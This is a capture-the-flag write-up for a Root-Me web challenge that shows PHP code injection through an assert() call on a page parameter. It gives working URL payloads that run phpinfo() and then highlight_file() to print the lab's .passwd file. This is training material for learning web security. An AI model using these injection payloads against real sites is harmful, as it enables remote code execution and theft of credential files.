By navigating on the website, we see that the pages are request via the variable ?page=YOUR_PAGE.
Like we did in Directory Traversal, we can try to enter ./, to open the current folder.
We get the following error message:

```
'includes/./.php'File does not exist
```

We certainly have something like a
```
include('$GET_[YOUR_PAGE].php')
```
 somewhere. Let's try to put a single quote in the name of our page, to try to inject the current PHP.

 http://challenge01.root-me.org/web-serveur/ch47/?page=%27 returns the following error code: (%27 is a single quote ')
 ```
 Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8
 ```

We see that the assert function is now creating an error. The assert function was used to make sure that we did not entered any .. in our YOUR_FILE

We should be able to inject that. http://challenge01.root-me.org/web-serveur/ch47/?page=%27.phpinfo().%27 create the following command in the PHP code:

```
strpos('includes/'.phpinfo().'.php', '..') === false
```

**phpinfo()** is executed, and we successfully made a php injection !

We can now inject something that is going to give us the content of .passwd.

http://challenge01.root-me.org/web-serveur/ch47/?page=%27.highlight_file(%22.passwd%22).%27

The password is now printed on the screen !
